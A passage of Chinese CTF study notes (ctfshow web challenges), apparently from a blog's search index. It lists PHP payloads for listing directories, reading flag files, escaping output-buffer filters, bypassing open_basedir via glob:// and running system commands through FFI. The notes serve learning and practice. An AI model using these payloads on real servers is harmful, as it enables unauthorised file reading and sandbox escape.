class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="variable">$filename</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="查看当前目录文件"><a href="#查看当前目录文件" class="headerlink" title="查看当前目录文件"></a>查看当前目录文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;__FILE__&#x27;</span>)));</span><br></pre></td></tr></table></figure>
+
+<h3 id="对scandir函数的替换"><a href="#对scandir函数的替换" class="headerlink" title="对scandir函数的替换"></a>对scandir函数的替换</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&#x27;*&#x27;</span>)     ---用通配符来便利全部文件</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>    --.可以用glob:<span class="comment">//*这个伪协议</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="与查看相关的函数-–php"><a href="#与查看相关的函数-–php" class="headerlink" title="与查看相关的函数  –php"></a>与查看相关的函数  –php</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>示例</th>
+<th>输出效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>var_dump</td>
+<td><code>var_dump($arr);</code></td>
+<td>类型+结构+值</td>
+</tr>
+<tr>
+<td>echo</td>
+<td><code>echo $arr;</code></td>
+<td>报错：数组不能 echo</td>
+</tr>
+<tr>
+<td>json_encode</td>
+<td><code>echo json_encode($arr);</code></td>
+<td><code>&#123;&quot;a&quot;:1,&quot;b&quot;:2&#125;</code></td>
+</tr>
+<tr>
+<td>serialize</td>
+<td><code>echo serialize($arr);</code></td>
+<td><code>a:2:&#123;s:1:&quot;a&quot;;i:1;...&#125;</code></td>
+</tr>
+<tr>
+<td>var_export</td>
+<td><code>var_export($arr);</code></td>
+<td><code>array (&#39;a&#39; =&gt; 1,...)</code></td>
+</tr>
+<tr>
+<td>get_defined_vars</td>
+<td>get_defined_vars()</td>
+<td>返回数组配合var_export函数使用</td>
+</tr>
+</tbody></table>
+<h3 id="对目录的一些操作"><a href="#对目录的一些操作" class="headerlink" title="对目录的一些操作"></a>对目录的一些操作</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">.      --当前目录</span><br><span class="line">..     --上一级目录</span><br><span class="line">../..  --上上级目录</span><br><span class="line">/      --根目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="通过复制或者重命名"><a href="#通过复制或者重命名" class="headerlink" title="通过复制或者重命名"></a>通过复制或者重命名</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// 将文件从 source 拷贝到 dest</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// 尝试把 oldname 重命名为 newname</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="如果出现缓冲区代换"><a href="#如果出现缓冲区代换" class="headerlink" title="如果出现缓冲区代换"></a>如果出现缓冲区代换</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();	<span class="comment">// 返回输出缓冲区的内容</span></span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();	<span class="comment">// 清空（擦除）缓冲区并关闭输出缓冲</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">使用<span class="keyword">exit</span>();提前退出即可</span><br></pre></td></tr></table></figure>
+
+<h2 id="open-basedir的限制"><a href="#open-basedir的限制" class="headerlink" title="open_basedir的限制"></a>open_basedir的限制</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。</span><br><span class="line">当程序要使用例如<span class="title function_ invoke__">fopen</span>()或<span class="title function_ invoke__">file_get_contents</span>()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-使用命令执行函数"><a href="#1-使用命令执行函数" class="headerlink" title="1.使用命令执行函数"></a>1.使用命令执行函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">因为open_basedir的设置只是对目录的限制，对system等命令执行函数是无效的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用伪协议-得不到文件内容"><a href="#2-使用伪协议-得不到文件内容" class="headerlink" title="2.使用伪协议(得不到文件内容)"></a>2.使用伪协议(得不到文件内容)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>   ---使用的是glob:<span class="comment">///伪协议，不直接触发 open_basedir 检查可绕过</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="php7-4以上-FFI"><a href="#php7-4以上-FFI" class="headerlink" title="php7.4以上(FFI)"></a>php7.4以上(FFI)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的     </span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
